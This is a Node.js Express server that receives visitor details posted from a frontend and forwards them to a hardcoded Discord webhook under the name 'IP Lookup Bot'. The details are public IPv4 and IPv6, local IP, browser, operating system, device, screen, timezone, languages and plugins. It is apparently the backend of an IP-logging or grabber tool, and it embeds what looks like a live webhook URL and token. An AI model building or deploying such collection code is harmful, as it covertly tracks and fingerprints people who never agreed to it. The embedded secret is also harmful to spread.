const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch'); // to send the request to the Discord webhook
const app = express();
const port = 3000;

const discordWebhookURL = "https://discordapp.com/api/webhooks/1327780867564769362/6ZIS35p7O6SxaVt30wxaj83l5Lu0YbzJZPQBMYqMSD7ZRHJxc4GFsT4A3rG9F30kyTwP"; // replace with your webhook URL

// Middleware to parse JSON requests
app.use(bodyParser.json());

// Endpoint to receive the data from the frontend
app.post('/sendData', async (req, res) => {
    try {
        const { ipv4, ipv6, localIp, browserDetails, fakeIp } = req.body;

        // Prepare the message for Discord
        const discordMessage = {
            username: "IP Lookup Bot",
            avatar_url: "",
            content: `
                Public IPv4: ${ipv4}
                Public IPv6: ${ipv6}
                Local IP: ${localIp}
                Fake IP: ${fakeIp}
                Browser: ${browserDetails.browser.name} ${browserDetails.browser.version}
                Browser Engine: ${browserDetails.engine.name} ${browserDetails.engine.version}
                JavaScript Engine: ${browserDetails.javascriptEngine}
                Operating System: ${browserDetails.operatingSystem.name} ${browserDetails.operatingSystem.version}
                Device: ${browserDetails.device.type}
                Language: ${browserDetails.language}
                Screen Resolution: ${browserDetails.screen.width}x${browserDetails.screen.height}
                Color Depth: ${browserDetails.screen.colorDepth}
                Timezone: ${browserDetails.timezone}
                Cookies Enabled: ${browserDetails.cookiesEnabled}
                Languages: ${browserDetails.languages.join(', ')}
                Plugins: ${browserDetails.plugins.join(', ')}
            `,
        };

        // Send the message to Discord
        const response = await fetch(discordWebhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordMessage),
        });

        if (response.ok) {
            console.log('Message sent to Discord');
            res.status(200).send('Data received and forwarded');
        } else {
            console.error('Error sending message to Discord');
            res.status(500).send('Failed to send data to Discord');
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('Error processing the data');
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
